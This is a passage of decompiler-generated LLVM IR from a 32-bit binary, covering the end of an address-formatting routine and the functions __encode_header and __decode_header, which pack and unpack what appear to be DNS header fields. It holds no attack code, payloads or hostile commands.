  store i32 %v1_804d80b, i32* @ebx, align 4
  br label %dec_label_pc_804d87f

dec_label_pc_804d80e:                             ; preds = %dec_label_pc_804d7f9, %dec_label_pc_804d7fd, %dec_label_pc_804d7f4
  %v1_804d80e = icmp eq i32 %v0_804d80e60, 0
  br i1 %v1_804d80e, label %dec_label_pc_804d816, label %dec_label_pc_804d812

dec_label_pc_804d812:                             ; preds = %dec_label_pc_804d80e
  %v1_804d812 = inttoptr i32 %v0_804d81258 to i8*
  store i8 58, i8* %v1_804d812, align 1
  %v0_804d815 = load i32, i32* @ebx, align 4
  %v1_804d815 = add i32 %v0_804d815, 1
  store i32 %v1_804d815, i32* @ebx, align 4
  %v0_804d816.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d816

dec_label_pc_804d816:                             ; preds = %dec_label_pc_804d80e, %dec_label_pc_804d812
  %v0_804d874 = phi i32 [ %v0_804d81258, %dec_label_pc_804d80e ], [ %v1_804d815, %dec_label_pc_804d812 ]
  %v1_804d86b = phi i32 [ 0, %dec_label_pc_804d80e ], [ %v0_804d816.pre, %dec_label_pc_804d812 ]
  %v9_804d816 = icmp eq i32 %v1_804d86b, 6
  %v1_804d819 = icmp eq i1 %v9_804d816, false
  br i1 %v1_804d819, label %dec_label_pc_804d86a, label %dec_label_pc_804d81b

dec_label_pc_804d81b:                             ; preds = %dec_label_pc_804d816
  %v0_804d81b = load i32, i32* @edi, align 4
  %v1_804d81b = icmp eq i32 %v0_804d81b, 0
  %v1_804d81d = icmp eq i1 %v1_804d81b, false
  br i1 %v1_804d81d, label %dec_label_pc_804d86a, label %dec_label_pc_804d81f

dec_label_pc_804d81f:                             ; preds = %dec_label_pc_804d81b
  %v0_804d81f = load i32, i32* @ebp, align 4
  %v9_804d81f = icmp eq i32 %v0_804d81f, 6
  br i1 %v9_804d81f, label %dec_label_pc_804d833, label %dec_label_pc_804d824

dec_label_pc_804d824:                             ; preds = %dec_label_pc_804d81f
  %v9_804d824 = icmp eq i32 %v0_804d81f, 5
  %v1_804d827 = icmp eq i1 %v9_804d824, false
  br i1 %v1_804d827, label %dec_label_pc_804d86a, label %dec_label_pc_804d829

dec_label_pc_804d829:                             ; preds = %dec_label_pc_804d824
  br i1 %v1_804d831, label %dec_label_pc_804d86a, label %dec_label_pc_804d833

dec_label_pc_804d833:                             ; preds = %dec_label_pc_804d829, %dec_label_pc_804d81f
  %v2_804d839 = sub i32 %v0_804d874, %v2_804d7e9
  store i32 %v2_804d839, i32* @esi, align 4
  %v2_804d844 = sub i32 46, %v2_804d839
  store i32 %v2_804d844, i32* @ecx, align 4
  store i32 %v0_804d874, i32* @edx, align 4
  %v1_804d848 = add i32 %arg2, 12
  store i32 %v1_804d848, i32* @eax, align 4
  %v0_804d84b = load i8*, i8** %stack_var_-124, align 4
  %v1_804d84b = ptrtoint i8* %v0_804d84b to i32
  %v3_804d84b = ptrtoint i8* %stack_var_-120.157 to i32
  %v5_804d84b = call i32 @inet_ntop4(i32 %v1_804d84b, i32 %v3_804d84b, i32 %stack_var_-116.156)
  store i32 %v5_804d84b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_804d852 = icmp eq i32 %v5_804d84b, 0
  br i1 %v1_804d852, label %dec_label_pc_804d8dc, label %dec_label_pc_804d85a

dec_label_pc_804d85a:                             ; preds = %dec_label_pc_804d833
  %v0_804d85d = load i32, i32* @ebx, align 4
  %v5_804d85d = inttoptr i32 %v0_804d85d to i8*
  store i8* %v5_804d85d, i8** %stack_var_-124, align 4
  %v3_804d85e = call i32 @strlen(i8* %v5_804d85d)
  store i32 %v3_804d85e, i32* %eax.global-to-local, align 4
  %v0_804d866 = load i32, i32* @ebx, align 4
  %v3_804d866 = add i32 %v0_804d866, %v3_804d85e
  store i32 %v3_804d866, i32* @ebx, align 4
  %v0_804d88e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d88e

dec_label_pc_804d86a:                             ; preds = %dec_label_pc_804d829, %dec_label_pc_804d824, %dec_label_pc_804d81b, %dec_label_pc_804d816
  %v0_804d86a = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804d86a, i32* %stack_var_-112, align 4
  %v2_804d86b = mul i32 %v1_804d86b, 4
  %v4_804d86b = add i32 %v3_804d86b, %v2_804d86b
  %v5_804d86b = inttoptr i32 %v4_804d86b to i32*
  %v6_804d86b = load i32, i32* %v5_804d86b, align 4
  %v5_804d874 = inttoptr i32 %v0_804d874 to i8*
  store i8* %v5_804d874, i8** %stack_var_-124, align 4
  %v6_804d875 = call i32 @sprintf(i32 %v0_804d874, i32 ptrtoint ([3 x i8]* @global_var_8050879.109 to i32), i32 %v6_804d86b, i32 %v0_804d86a)
  store i32 %v6_804d875, i32* %eax.global-to-local, align 4
  %v0_804d87d = load i32, i32* @ebx, align 4
  %v2_804d87d = add i32 %v0_804d87d, %v6_804d875
  store i32 %v2_804d87d, i32* @ebx, align 4
  br label %dec_label_pc_804d87f

dec_label_pc_804d87f:                             ; preds = %dec_label_pc_804d804, %dec_label_pc_804d808, %dec_label_pc_804d86a
  %stack_var_-116.0 = phi i32 [ %v6_804d86b, %dec_label_pc_804d86a ], [ %stack_var_-116.156, %dec_label_pc_804d804 ], [ %stack_var_-116.156, %dec_label_pc_804d808 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8050879.109, i32 0, i32 0), %dec_label_pc_804d86a ], [ %stack_var_-120.157, %dec_label_pc_804d804 ], [ %stack_var_-120.157, %dec_label_pc_804d808 ]
  %v0_804d80819 = phi i32 [ %v2_804d87d, %dec_label_pc_804d86a ], [ %v0_804d81258, %dec_label_pc_804d804 ], [ %v1_804d80b, %dec_label_pc_804d808 ]
  %v0_804d87f = load i32, i32* @esi, align 4
  %v1_804d87f = add i32 %v0_804d87f, 1
  %v0_804d889.pre = load i32, i32* @edi, align 4
  store i32 %v1_804d87f, i32* @esi, align 4
  %v7_804d883 = icmp sgt i32 %v1_804d87f, 7
  %v10_804d889 = icmp eq i32 %v0_804d889.pre, -1
  br i1 %v7_804d883, label %dec_label_pc_804d889, label %dec_label_pc_804d7f4

dec_label_pc_804d889:                             ; preds = %dec_label_pc_804d87f
  br i1 %v10_804d889, label %dec_label_pc_804d89a, label %dec_label_pc_804d88e

dec_label_pc_804d88e:                             ; preds = %dec_label_pc_804d889, %dec_label_pc_804d85a
  %v0_804d896 = phi i32 [ %v0_804d80819, %dec_label_pc_804d889 ], [ %v3_804d866, %dec_label_pc_804d85a ]
  %v0_804d88e = phi i32 [ %v0_804d889.pre, %dec_label_pc_804d889 ], [ %v0_804d88e.pre, %dec_label_pc_804d85a ]
  %v1_804d88e = load i32, i32* @ebp, align 4
  %v2_804d88e = add i32 %v1_804d88e, %v0_804d88e
  store i32 %v2_804d88e, i32* %eax.global-to-local, align 4
  %v9_804d891 = icmp eq i32 %v2_804d88e, 8
  %v1_804d894 = icmp eq i1 %v9_804d891, false
  br i1 %v1_804d894, label %dec_label_pc_804d89a, label %dec_label_pc_804d896

dec_label_pc_804d896:                             ; preds = %dec_label_pc_804d88e
  %v1_804d896 = inttoptr i32 %v0_804d896 to i8*
  store i8 58, i8* %v1_804d896, align 1
  %v0_804d899 = load i32, i32* @ebx, align 4
  %v1_804d899 = add i32 %v0_804d899, 1
  store i32 %v1_804d899, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d89a

dec_label_pc_804d89a:                             ; preds = %dec_label_pc_804d88e, %dec_label_pc_804d889, %dec_label_pc_804d896
  %v0_804d89e = phi i32 [ %v0_804d896, %dec_label_pc_804d88e ], [ %v0_804d80819, %dec_label_pc_804d889 ], [ %v1_804d899, %dec_label_pc_804d896 ]
  store i32 %v2_804d7e9, i32* %edx.global-to-local, align 4
  %v1_804d89e = add i32 %v0_804d89e, 1
  store i32 %v1_804d89e, i32* %eax.global-to-local, align 4
  %v1_804d8a1 = inttoptr i32 %v0_804d89e to i8*
  store i8 0, i8* %v1_804d8a1, align 1
  %v0_804d8a4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d8a4 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d8a4 = sub i32 %v0_804d8a4, %v1_804d8a4
  store i32 %v2_804d8a4, i32* @eax, align 4
  %tmp71 = icmp ugt i32 %v2_804d8a4, %arg4
  br i1 %tmp71, label %dec_label_pc_804d8ac, label %dec_label_pc_804d8b9

dec_label_pc_804d8ac:                             ; preds = %dec_label_pc_804d89a
  %v0_804d8ac = load i8*, i8** %stack_var_-124, align 4
  %v1_804d8ac = ptrtoint i8* %v0_804d8ac to i32
  %v2_804d8ac = call i32 @__errno_location(i32 %v1_804d8ac)
  store i32 %v2_804d8ac, i32* %eax.global-to-local, align 4
  %v1_804d8b1 = inttoptr i32 %v2_804d8ac to i32*
  store i32 28, i32* %v1_804d8b1, align 4
  br label %dec_label_pc_804d8da

dec_label_pc_804d8b9:                             ; preds = %dec_label_pc_804d89a
  %v0_804d8b9 = load i32, i32* @edi, align 4
  store i32 %v0_804d8b9, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_804d8bc2 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_804d8bc2, i32* %tmp46, align 4
  %v0_804d8c3.cast = inttoptr i32 %v3_804d8bc2 to i8*
  %v5_804d8c3 = call i32 @strcpy(i8* %v0_804d8c3.cast, i32 %v2_804d7e9)
  store i32 %v5_804d8c3, i32* %eax.global-to-local, align 4
  store i32 %v5_804d8c3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d8dc

dec_label_pc_804d8cf:                             ; preds = %dec_label_pc_804d725
  %v1_804d8cf = call i32 @__errno_location(i32 %v0_804d718)
  store i32 %v1_804d8cf, i32* %eax.global-to-local, align 4
  %v1_804d8d4 = inttoptr i32 %v1_804d8cf to i32*
  store i32 97, i32* %v1_804d8d4, align 4
  br label %dec_label_pc_804d8da

dec_label_pc_804d8da:                             ; preds = %dec_label_pc_804d8ac, %dec_label_pc_804d8cf
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804d8dc

dec_label_pc_804d8dc:                             ; preds = %dec_label_pc_804d833, %dec_label_pc_804d730, %dec_label_pc_804d8b9, %dec_label_pc_804d8da
  %v0_804d8df = phi i32 [ 0, %dec_label_pc_804d833 ], [ %v3_804d73c, %dec_label_pc_804d730 ], [ %v5_804d8c3, %dec_label_pc_804d8b9 ], [ 0, %dec_label_pc_804d8da ]
  store i32 %v0_804d8df, i32* %eax.global-to-local, align 4
  store i32 %v0_804d718, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d8df

; uselistorder directives
  uselistorder i32 %v0_804d8df, { 1, 0 }
  uselistorder i32 %v0_804d89e, { 1, 0 }
  uselistorder i1 %v10_804d889, { 1, 0 }
  uselistorder i32 %v0_804d889.pre, { 1, 0, 2 }
  uselistorder i32 %v1_804d87f, { 1, 0, 2 }
  uselistorder i32 %v1_804d86b, { 1, 0 }
  uselistorder i32 %v0_804d874, { 3, 2, 0, 1 }
  uselistorder i32 %v2_804d800, { 1, 0 }
  uselistorder i32 %v2_804d7f9, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.156, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.157, { 2, 1, 0 }
  uselistorder i32 %v0_804d81258, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804d80459, { 2, 1, 0 }
  uselistorder i32 %v0_804d80e60, { 2, 6, 5, 1, 4, 3, 0 }
  uselistorder i32 %v2_804d7e9, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804d88918, { 1, 0 }
  uselistorder i32 %v1_804d7de, { 1, 0 }
  uselistorder i32 %v0_804d7de, { 1, 0, 2 }
  uselistorder i32 %v5_804d7e6, { 1, 2, 0 }
  uselistorder i32 %v1_804d7c1, { 0, 2, 1 }
  uselistorder i32 %v0_804d7b19, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804d7bc13, { 1, 2, 0, 3 }
  uselistorder i1 %v10_804d7ac, { 1, 0 }
  uselistorder i32 %v0_804d7d762, { 1, 0, 3, 2 }
  uselistorder i32 %v0_804d7cc63, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_804d7c165, { 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_804d77966, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v0_804d718, { 0, 2, 1 }
  uselistorder i32* %stack_var_-112, { 0, 1, 3, 2 }
  uselistorder i8** %stack_var_-124, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32* %edx.global-to-local, { 6, 7, 8, 9, 0, 1, 2, 3, 4, 5 }
  uselistorder i32* %ebx.global-to-local, { 6, 7, 3, 4, 0, 2, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 14, 15, 16, 19, 17, 18, 20, 22, 21, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 97, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 3, 0, 1, 2 }
  uselistorder [3 x i8]* @global_var_8050879.109, { 1, 0 }
  uselistorder i8 58, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_804d8dc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804d8da, { 1, 0 }
  uselistorder label %dec_label_pc_804d89a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d87f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d816, { 1, 0 }
  uselistorder label %dec_label_pc_804d80e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d7f4, { 1, 0 }
  uselistorder label %dec_label_pc_804d7e9, { 1, 0 }
  uselistorder label %dec_label_pc_804d7d9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d7d5, { 1, 0 }
  uselistorder label %dec_label_pc_804d7c1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804d7be, { 1, 0 }
  uselistorder label %dec_label_pc_804d794, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_4()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804d8ec = load i32, i32* @ebx, align 4
  store i32 %v0_804d8ec, i32* %stack_var_-8, align 4
  store i32 %tmp8, i32* %ebx.global-to-local, align 4
  %v4_804d8f6 = ptrtoint i8* %tmp to i32
  store i32 %v4_804d8f6, i32* %esi.global-to-local, align 4
  %v7_804d8fa = icmp sgt i32 %tmp9, 11
  br i1 %v7_804d8fa, label %dec_label_pc_804d900, label %dec_label_pc_804d994

dec_label_pc_804d900:                             ; preds = %entry
  %v1_804d900 = add i32 %tmp8, 1
  %v2_804d900 = inttoptr i32 %v1_804d900 to i8*
  %v3_804d900 = load i8, i8* %v2_804d900, align 1
  store i8 %v3_804d900, i8* %tmp, align 1
  %v0_804d906 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d906 = inttoptr i32 %v0_804d906 to i32*
  %v2_804d906 = load i32, i32* %v1_804d906, align 4
  %v1_804d908 = trunc i32 %v2_804d906 to i8
  %v2_804d908 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d908 = add i32 %v2_804d908, 1
  %v4_804d908 = inttoptr i32 %v3_804d908 to i8*
  store i8 %v1_804d908, i8* %v4_804d908, align 1
  store i32 4, i32* %edx.global-to-local, align 4
  %v0_804d92d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d92d = add i32 %v0_804d92d, 8
  %v2_804d92d = inttoptr i32 %v1_804d92d to i32*
  %v3_804d92d = load i32, i32* %v2_804d92d, align 4
  %v1_804d930 = mul i32 %v3_804d92d, 8
  %v2_804d933 = and i32 %v1_804d930, 120
  %v2_804d936 = or i32 %v2_804d933, 4
  store i32 %v2_804d936, i32* %edx.global-to-local, align 4
  %v1_804d938 = add i32 %v0_804d92d, 20
  %v2_804d938 = inttoptr i32 %v1_804d938 to i32*
  %v3_804d938 = load i32, i32* %v2_804d938, align 4
  %v4_804d938 = icmp eq i32 %v3_804d938, 0
  %v1_804d93c = icmp eq i1 %v4_804d938, false
  %v2_804d93c = zext i1 %v1_804d93c to i32
  %v2_804d93f = or i32 %v2_804d93c, %v2_804d936
  store i32 %v2_804d93f, i32* %edx.global-to-local, align 4
  %v2_804d941 = or i32 %v2_804d93f, 130
  %v3_804d941 = trunc i32 %v2_804d941 to i8
  store i32 %v2_804d941, i32* @ecx, align 4
  %v2_804d943 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d943 = add i32 %v2_804d943, 2
  %v4_804d943 = inttoptr i32 %v3_804d943 to i8*
  store i8 %v3_804d941, i8* %v4_804d943, align 1
  %v0_804d946 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d94a = add i32 %v0_804d946, 28
  %v2_804d94a = inttoptr i32 %v1_804d94a to i8*
  %v3_804d94a = load i8, i8* %v2_804d94a, align 1
  %v5_804d94a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d953 = urem i8 %v3_804d94a, 16
  %v7_804d953 = zext i8 %v2_804d953 to i32
  %v9_804d953 = and i32 %v5_804d94a, -256
  %v10_804d953 = or i32 %v9_804d953, %v7_804d953
  store i32 %v10_804d953, i32* %edx.global-to-local, align 4
  %v2_804d956 = or i8 %v2_804d953, -128
  %v2_804d958 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d958 = add i32 %v2_804d958, 3
  %v4_804d958 = inttoptr i32 %v3_804d958 to i8*
  store i8 %v2_804d956, i8* %v4_804d958, align 1
  %v0_804d95b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d95b = add i32 %v0_804d95b, 33
  %v2_804d95b = inttoptr i32 %v1_804d95b to i8*
  %v3_804d95b = load i8, i8* %v2_804d95b, align 1
  %v2_804d95f = load i32, i32* %esi.global-to-local, align 4
  %v3_804d95f = add i32 %v2_804d95f, 4
  %v4_804d95f = inttoptr i32 %v3_804d95f to i8*
  store i8 %v3_804d95b, i8* %v4_804d95f, align 1
  %v0_804d962 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d962 = add i32 %v0_804d962, 32
  %v2_804d962 = inttoptr i32 %v1_804d962 to i32*
  %v3_804d962 = load i32, i32* %v2_804d962, align 4
  %v1_804d965 = trunc i32 %v3_804d962 to i8
  %v2_804d965 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d965 = add i32 %v2_804d965, 5
  %v4_804d965 = inttoptr i32 %v3_804d965 to i8*
  store i8 %v1_804d965, i8* %v4_804d965, align 1
  %v0_804d968 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d968 = add i32 %v0_804d968, 37
  %v2_804d968 = inttoptr i32 %v1_804d968 to i8*
  %v3_804d968 = load i8, i8* %v2_804d968, align 1
  %v2_804d96c = load i32, i32* %esi.global-to-local, align 4
  %v3_804d96c = add i32 %v2_804d96c, 6
  %v4_804d96c = inttoptr i32 %v3_804d96c to i8*
  store i8 %v3_804d968, i8* %v4_804d96c, align 1
  %v0_804d96f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d96f = add i32 %v0_804d96f, 36
  %v2_804d96f = inttoptr i32 %v1_804d96f to i32*
  %v3_804d96f = load i32, i32* %v2_804d96f, align 4
  %v1_804d972 = trunc i32 %v3_804d96f to i8
  %v2_804d972 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d972 = add i32 %v2_804d972, 7
  %v4_804d972 = inttoptr i32 %v3_804d972 to i8*
  store i8 %v1_804d972, i8* %v4_804d972, align 1
  %v0_804d975 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d975 = add i32 %v0_804d975, 41
  %v2_804d975 = inttoptr i32 %v1_804d975 to i8*
  %v3_804d975 = load i8, i8* %v2_804d975, align 1
  %v2_804d979 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d979 = add i32 %v2_804d979, 8
  %v4_804d979 = inttoptr i32 %v3_804d979 to i8*
  store i8 %v3_804d975, i8* %v4_804d979, align 1
  %v0_804d97c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d97c = add i32 %v0_804d97c, 40
  %v2_804d97c = inttoptr i32 %v1_804d97c to i32*
  %v3_804d97c = load i32, i32* %v2_804d97c, align 4
  %v1_804d97f = trunc i32 %v3_804d97c to i8
  %v2_804d97f = load i32, i32* %esi.global-to-local, align 4
  %v3_804d97f = add i32 %v2_804d97f, 9
  %v4_804d97f = inttoptr i32 %v3_804d97f to i8*
  store i8 %v1_804d97f, i8* %v4_804d97f, align 1
  %v0_804d982 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d982 = add i32 %v0_804d982, 45
  %v2_804d982 = inttoptr i32 %v1_804d982 to i8*
  %v3_804d982 = load i8, i8* %v2_804d982, align 1
  %v2_804d986 = load i32, i32* %esi.global-to-local, align 4
  %v3_804d986 = add i32 %v2_804d986, 10
  %v4_804d986 = inttoptr i32 %v3_804d986 to i8*
  store i8 %v3_804d982, i8* %v4_804d986, align 1
  %v0_804d989 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d989 = add i32 %v0_804d989, 44
  %v2_804d989 = inttoptr i32 %v1_804d989 to i32*
  %v3_804d989 = load i32, i32* %v2_804d989, align 4
  %v1_804d98c = trunc i32 %v3_804d989 to i8
  %v2_804d98c = load i32, i32* %esi.global-to-local, align 4
  %v3_804d98c = add i32 %v2_804d98c, 11
  %v4_804d98c = inttoptr i32 %v3_804d98c to i8*
  store i8 %v1_804d98c, i8* %v4_804d98c, align 1
  %v2_804d994.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_804d994

dec_label_pc_804d994:                             ; preds = %entry, %dec_label_pc_804d900
  %v2_804d994 = phi i32 [ %v0_804d8ec, %entry ], [ %v2_804d994.pre, %dec_label_pc_804d900 ]
  %v0_804d996 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_804d900 ]
  store i32 %v2_804d994, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804d996

; uselistorder directives
  uselistorder i32 41, { 1, 0 }
  uselistorder label %dec_label_pc_804d994, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_4()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d998 = load i32, i32* @ebx, align 4
  store i32 %v0_804d998, i32* %stack_var_-4, align 4
  %v4_804d999 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_804d999, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_804d9a1 = load i8, i8* %tmp2, align 1
  %v3_804d9a1 = zext i8 %v2_804d9a1 to i32
  %v1_804d9a4 = add i32 %v4_804d999, 1
  %v2_804d9a4 = inttoptr i32 %v1_804d9a4 to i8*
  %v3_804d9a4 = load i8, i8* %v2_804d9a4, align 1
  %v4_804d9a4 = zext i8 %v3_804d9a4 to i32
  %v2_804d9a8 = mul nuw nsw i32 %v3_804d9a1, 256
  %v2_804d9ab = or i32 %v4_804d9a4, %v2_804d9a8
  %v2_804d9ad = inttoptr i32 %tmp to i32*
  store i32 %v2_804d9ab, i32* %v2_804d9ad, align 4
  %v0_804d9af = load i32, i32* @ecx, align 4
  %v1_804d9af = add i32 %v0_804d9af, 2
  %v2_804d9af = inttoptr i32 %v1_804d9af to i8*
  %v3_804d9af = load i8, i8* %v2_804d9af, align 1
  %tmp6 = icmp slt i8 %v3_804d9af, 0
  %v2_804d9b3 = zext i1 %tmp6 to i32
  %v1_804d9b6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9b6 = add i32 %v1_804d9b6, 4
  %v3_804d9b6 = inttoptr i32 %v2_804d9b6 to i32*
  store i32 %v2_804d9b3, i32* %v3_804d9b6, align 4
  %v0_804d9b9 = load i32, i32* @ecx, align 4
  %v1_804d9b9 = add i32 %v0_804d9b9, 2
  %v2_804d9b9 = inttoptr i32 %v1_804d9b9 to i8*
  %v3_804d9b9 = load i8, i8* %v2_804d9b9, align 1
  %v3_804d9bc = udiv i8 %v3_804d9b9, 8
  %tmp7 = urem i8 %v3_804d9bc, 16
  %v1_804d9bf = zext i8 %tmp7 to i32
  %v1_804d9c2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9c2 = add i32 %v1_804d9c2, 8
  %v3_804d9c2 = inttoptr i32 %v2_804d9c2 to i32*
  store i32 %v1_804d9bf, i32* %v3_804d9c2, align 4
  %v0_804d9c5 = load i32, i32* @ecx, align 4
  %v1_804d9c5 = add i32 %v0_804d9c5, 2
  %v2_804d9c5 = inttoptr i32 %v1_804d9c5 to i8*
  %v3_804d9c5 = load i8, i8* %v2_804d9c5, align 1
  %div = udiv i8 %v3_804d9c5, 4
  %tmp8 = urem i8 %div, 2
  %v1_804d9cc = zext i8 %tmp8 to i32
  %v1_804d9cf = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9cf = add i32 %v1_804d9cf, 12
  %v3_804d9cf = inttoptr i32 %v2_804d9cf to i32*
  store i32 %v1_804d9cc, i32* %v3_804d9cf, align 4
  %v0_804d9d2 = load i32, i32* @ecx, align 4
  %v1_804d9d2 = add i32 %v0_804d9d2, 2
  %v2_804d9d2 = inttoptr i32 %v1_804d9d2 to i8*
  %v3_804d9d2 = load i8, i8* %v2_804d9d2, align 1
  %div5 = udiv i8 %v3_804d9d2, 2
  %tmp9 = urem i8 %div5, 2
  %v1_804d9d8 = zext i8 %tmp9 to i32
  %v1_804d9db = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9db = add i32 %v1_804d9db, 16
  %v3_804d9db = inttoptr i32 %v2_804d9db to i32*
  store i32 %v1_804d9d8, i32* %v3_804d9db, align 4
  %v0_804d9de = load i32, i32* @ecx, align 4
  %v1_804d9de = add i32 %v0_804d9de, 2
  %v2_804d9de = inttoptr i32 %v1_804d9de to i8*
  %v3_804d9de = load i8, i8* %v2_804d9de, align 1
  %tmp10 = urem i8 %v3_804d9de, 2
  %v1_804d9e2 = zext i8 %tmp10 to i32
  %v1_804d9e5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9e5 = add i32 %v1_804d9e5, 20
  %v3_804d9e5 = inttoptr i32 %v2_804d9e5 to i32*
  store i32 %v1_804d9e2, i32* %v3_804d9e5, align 4
  %v0_804d9e8 = load i32, i32* @ecx, align 4
  %v1_804d9e8 = add i32 %v0_804d9e8, 3
  %v2_804d9e8 = inttoptr i32 %v1_804d9e8 to i8*
  %v3_804d9e8 = load i8, i8* %v2_804d9e8, align 1
  %tmp11 = icmp slt i8 %v3_804d9e8, 0
  %v2_804d9ec = zext i1 %tmp11 to i32
  %v1_804d9ef = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9ef = add i32 %v1_804d9ef, 24
  %v3_804d9ef = inttoptr i32 %v2_804d9ef to i32*
  store i32 %v2_804d9ec, i32* %v3_804d9ef, align 4
  %v0_804d9f2 = load i32, i32* @ecx, align 4
  %v1_804d9f2 = add i32 %v0_804d9f2, 3
  %v2_804d9f2 = inttoptr i32 %v1_804d9f2 to i8*
  %v3_804d9f2 = load i8, i8* %v2_804d9f2, align 1
  %tmp12 = urem i8 %v3_804d9f2, 16
  %v1_804d9f6 = zext i8 %tmp12 to i32
  %v1_804d9f9 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804d9f9 = add i32 %v1_804d9f9, 28
  %v3_804d9f9 = inttoptr i32 %v2_804d9f9 to i32*
  store i32 %v1_804d9f6, i32* %v3_804d9f9, align 4
  %v0_804d9fc = load i32, i32* @ecx, align 4
  %v1_804d9fc = add i32 %v0_804d9fc, 4
  %v2_804d9fc = inttoptr i32 %v1_804d9fc to i8*
  %v3_804d9fc = load i8, i8* %v2_804d9fc, align 1
  %v4_804d9fc = zext i8 %v3_804d9fc to i32
  %v1_804da00 = add i32 %v0_804d9fc, 5
  %v2_804da00 = inttoptr i32 %v1_804da00 to i8*
  %v3_804da00 = load i8, i8* %v2_804da00, align 1
  %v4_804da00 = zext i8 %v3_804da00 to i32
  %v2_804da04 = mul nuw nsw i32 %v4_804d9fc, 256
  %v2_804da07 = or i32 %v4_804da00, %v2_804da04
  %v1_804da09 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804da09 = add i32 %v1_804da09, 32
  %v3_804da09 = inttoptr i32 %v2_804da09 to i32*
  store i32 %v2_804da07, i32* %v3_804da09, align 4
  %v0_804da0c = load i32, i32* @ecx, align 4
  %v1_804da0c = add i32 %v0_804da0c, 6
  %v2_804da0c = inttoptr i32 %v1_804da0c to i8*
  %v3_804da0c = load i8, i8* %v2_804da0c, align 1
  %v4_804da0c = zext i8 %v3_804da0c to i32
  %v1_804da10 = add i32 %v0_804da0c, 7
  %v2_804da10 = inttoptr i32 %v1_804da10 to i8*
  %v3_804da10 = load i8, i8* %v2_804da10, align 1
  %v4_804da10 = zext i8 %v3_804da10 to i32
  %v2_804da14 = mul nuw nsw i32 %v4_804da0c, 256
  %v2_804da17 = or i32 %v4_804da10, %v2_804da14
  %v1_804da19 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804da19 = add i32 %v1_804da19, 36
  %v3_804da19 = inttoptr i32 %v2_804da19 to i32*
